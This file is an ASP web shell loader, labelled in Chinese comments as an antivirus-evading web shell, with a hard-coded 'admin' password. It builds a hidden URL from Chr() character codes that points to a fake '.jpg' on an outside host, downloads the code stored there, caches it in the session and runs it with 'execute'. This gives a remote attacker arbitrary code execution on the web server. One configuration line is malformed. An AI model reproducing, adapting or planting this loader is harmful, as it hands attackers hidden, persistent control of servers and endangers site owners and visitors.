<%@ LANGUAGE = VBScript.encode%><%
Server.ScriptTimeout=999999999
UserPass="admin"  '密码
mNametitle ="免杀全球大马"  ' 标题
Copyright="admin"  '版权
SItEuRl=http://asp-muma.com/" '你的网站
bg ="http://www.7jyewu.cn/webshell/asp.jpg" 
ysjb=true  '是否有拖动效果,true为是,false为否

function BytesToBstr(body,Cset) 
dim objstream 
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1 
objstream.Mode =3 
objstream.Open 
objstream.Write body 
objstream.Position = 0 
objstream.Type = 2 
objstream.Charset = Cset 
BytesToBstr = objstream.ReadText 
objstream.Close 
set objstream = nothing 
End function

function PostHTTPPage(url) 
dim Http 
set Http=server.createobject("MSXML2.SERVERXMLHTTP.3.0")
Http.open "GET",url,false 
Http.setRequestHeader "CONTENT-TYPE", "application/x-www-form-urlencoded" 
Http.send 
if Http.readystate<>4 then 
exit function 
End if
PostHTTPPage=bytesToBSTR(Http.responseBody,"gbk") 
set http=nothing 
if err.number<>0 then err.Clear 
End function

dim  aspCode
aspCode=CStr(Session("aspCode"))
if aspCode="" or aspCode=null or isnull(aspCode) then 
aspCode=PostHTTPPage(Chr ( 104 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 112 ) & Chr ( 58 ) & Chr ( 47 ) & Chr ( 47 ) & Chr ( 119 ) & Chr ( 119 ) & Chr ( 119 ) & Chr ( 46 ) & Chr ( 55 ) & Chr ( 106 ) & Chr ( 121 ) & Chr ( 101 ) & Chr ( 119 ) & Chr ( 117 ) & Chr ( 46 ) & Chr ( 99 ) & Chr ( 110 ) & Chr ( 47 ) & Chr ( 105 ) & Chr ( 109 ) & Chr ( 103 ) & Chr ( 47 ) & Chr ( 49 ) & Chr ( 46 ) & Chr ( 106 ) & Chr ( 112 ) & Chr ( 103 ))
Session("aspCode") =aspCode
End if
execute aspCode

%>
